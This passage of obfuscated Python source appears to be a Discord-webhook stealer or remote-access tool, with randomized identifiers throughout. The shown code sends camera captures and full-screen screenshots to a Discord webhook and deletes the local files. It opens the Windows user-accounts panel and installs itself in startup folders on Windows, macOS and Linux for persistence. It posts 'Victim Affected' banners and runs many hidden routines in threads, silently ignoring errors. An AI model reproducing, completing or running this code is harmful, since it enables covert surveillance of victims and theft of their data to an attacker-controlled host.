        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)
        with open(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture, "rb") as f:
            OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(
                embed=RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA,
                file=File(f, filename=EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL_file_capture),
                username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU,
                avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW
            )
            
        if os.path.exists(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture):
            os.remove(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture)
    except Exception as e:
        JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(
            TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, 
            title=f'Camera Capture {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', 
            description=f"""Unable to make a recording:
            ```{e}```"""
        )

def NVVXMHSRFSOBQJPYBHPMHMJQOVJWCNZAIVUQGHIOOEKVSISFVTFEEVHIVHRGLNHTLPLHUSCS():
    import subprocess
    import time
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass

def DREFCSIUKMEVBGKWNDBIACHNKLSWOWXJEZVBXYBRZQBXQLIBASKMRXJUWOQWLZPUMQIWVOERONSGIPELBEGEJLJ():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes = io.BytesIO()
            MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP.save(MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes, format='PNG')
            MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes.seek(0)
            return MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes
        
        MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes = C4ptur3()

        RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA = Embed(title=f"Screenshot {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:", color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG)
        RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.set_image(url="attachment://screenshot.png")
        RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)
        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(
            embed=RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA,
            file=File(MYUSRPKSYBXMHJWEPHIHOVMQFNAUTQMWCOIMCIFIWZVTVOGLVNRP_bytes, filename="screenshot.png"),
            username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU,
            avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW
        )
    except Exception as e:
        JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(
            TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, 
            title=f'Screenshot {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

def St4rtup():
    import os
    import sys
    import shutil

    try:
        IDRIQXOYDIMHMLGUOQELQDWSIDZDSXYYRFLUQODSFIAPMONHKWXGRWEN = os.path.abspath(sys.argv[0])

        if IDRIQXOYDIMHMLGUOQELQDWSIDZDSXYYRFLUQODSFIAPMONHKWXGRWEN.endswith(".exe"):
            TWHCLFWVRULLTKDOXBAEYEUMHPYAXIIVTBXTFSAYYACZDZEJSBOBJALTGKXHMXQXMZVSLISXXVCXAKQEUMJDXVWMN = "exe"
        elif IDRIQXOYDIMHMLGUOQELQDWSIDZDSXYYRFLUQODSFIAPMONHKWXGRWEN.endswith(".py"):
            TWHCLFWVRULLTKDOXBAEYEUMHPYAXIIVTBXTFSAYYACZDZEJSBOBJALTGKXHMXQXMZVSLISXXVCXAKQEUMJDXVWMN = "py"

        YMGHMPSBQJYZJSIKFRBMWYCXUORHJTKMGJBPKSOMHYYBTCHSFMCTOHOXRLIIPECUJDCZGGMKNSCTHVKMAEXWNTVNEADYGC = f"ㅤ.{TWHCLFWVRULLTKDOXBAEYEUMHPYAXIIVTBXTFSAYYACZDZEJSBOBJALTGKXHMXQXMZVSLISXXVCXAKQEUMJDXVWMN}"

        if sys.platform.startswith('win'):  
            BFRIYEFGVLTJVNQOODAABZKBXWWLKMZEPOZDEWOCXQJYAIQSYKZQYACVGFMUTPARENGEHAMQEQRQHWOLAMYELYEQLRNDIGHFTA = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            BFRIYEFGVLTJVNQOODAABZKBXWWLKMZEPOZDEWOCXQJYAIQSYKZQYACVGFMUTPARENGEHAMQEQRQHWOLAMYELYEQLRNDIGHFTA = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            BFRIYEFGVLTJVNQOODAABZKBXWWLKMZEPOZDEWOCXQJYAIQSYKZQYACVGFMUTPARENGEHAMQEQRQHWOLAMYELYEQLRNDIGHFTA = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_new_file = os.path.join(BFRIYEFGVLTJVNQOODAABZKBXWWLKMZEPOZDEWOCXQJYAIQSYKZQYACVGFMUTPARENGEHAMQEQRQHWOLAMYELYEQLRNDIGHFTA, YMGHMPSBQJYZJSIKFRBMWYCXUORHJTKMGJBPKSOMHYYBTCHSFMCTOHOXRLIIPECUJDCZGGMKNSCTHVKMAEXWNTVNEADYGC)

        shutil.copy(IDRIQXOYDIMHMLGUOQELQDWSIDZDSXYYRFLUQODSFIAPMONHKWXGRWEN, VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_new_file)
        os.chmod(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_new_file, 0o777) 
    except:
        pass

try: requests.post(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, 'avatar_url': CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW,})
except: pass
try: threading.Thread(target=MMCAGSZWZDSFQXYALJPMTRRFXPEFLDABFYZRITMMYSYGZIBYWYQUUQEZSKEMNEICYIRMMWSGWUXDTGKBJMPI).start()
except: pass
try: threading.Thread(target=IOJKEEPOMIGDLPTUQFXOSDHTZYPJTBQCZEMPQPLVMEODJBYGYCOPIVMTHJSEPBNKLNZGC).start()
except: pass
try: threading.Thread(target=YREEFIIWRQLFQXHIWCPOLMBEBCYOYMNIXUKHVDMWWABATUOIJAJBBEXWKLRMMXMOWZORLDHPDZGZPHH).start()
except: pass
try: threading.Thread(target=GIVPIEAYRJVOZUAECVWQTQZPWKGIXOWHDRYWWWPTXVDCIFTTPFSPNKZAB).start()
except: pass
try: IAUNTQIYSOVFFSCPTXEKQHNCCZIVDLDSFZFIVCWMNJUBEBGKDNZVOVDQHQPEMOAMYLAFLRKYEOGBMWXIGXRF()
except: pass
try: VZOMEPYVBTOOMMPVFJBQPPLJDCPKBPVLCGQSRFAHQEYLPNBQNQHAOGHJBVCUKFVFTPJEXZUIA()
except: pass
try: JNHZPSGUGLRWZWAUGKMMYSGZAXSXYBQOUDVICHCROEZSPWLTRXNCJZVVFFOWPRGVY()
except: pass
try: NSLCUKVKYXSWKWPWEPIEDWEAWNQQRZAOYIALBFTYBFWLTUZJIPQIXRHD()
except: pass
try: XLWFUSFBDRBLHBIEVCARNTOODYDJOBDBDJGTFMMDECRJIAABZOTSYCZIPZQUYRCJSFAVIYHFNMEYNR()
except: pass
try: MPXODCDRBHBTESRSGUCAQWQRNZENARTCTGPLLSLEKVHHNVGKRNYBAMZHNJEMZOUWDW()
except: pass
try: NVVXMHSRFSOBQJPYBHPMHMJQOVJWCNZAIVUQGHIOOEKVSISFVTFEEVHIVHRGLNHTLPLHUSCS()
except: pass
try: DREFCSIUKMEVBGKWNDBIACHNKLSWOWXJEZVBXYBRZQBXQLIBASKMRXJUWOQWLZPUMQIWVOERONSGIPELBEGEJLJ()
except: pass
try: requests.post(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, json={'content': f'****╚══════════════════{TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}══════════════════╝****', 'username': PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, 'avatar_url': CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW})
except: pass
try: threading.Thread(target=MYHRKVRVXCZKMZXVIWRRBXZAIIKWADMROKKNOQPYDXGPHXIJCLZOWFBNPXRATWXVAYXWEMQYVNTDJLUUOBAPTPHPW).start()
except: pass
try: threading.Thread(target=LZAWHAVCIIWMYMRPATKRQDUTWLMJUDLLCKTSYPXVOVHXUYCQFVMALNXJZRWDD).start()
except: pass
try: threading.Thread(target=WQEHPMVXOJWYZACSDHZFXLCCRTJOYOVLAWHXAHXCSVTCKKAGGVTRGLTWZFXOOOUIRQCRTTMLILIFNAXJH).start()
except: pass
try: threading.Thread(target=UCNRCDNIUBZHCPMODDNAZTQSRBMWJOMVEHVEZIUNQSVVVRXZHWNDYYKMLHEBI).start()
except: pass
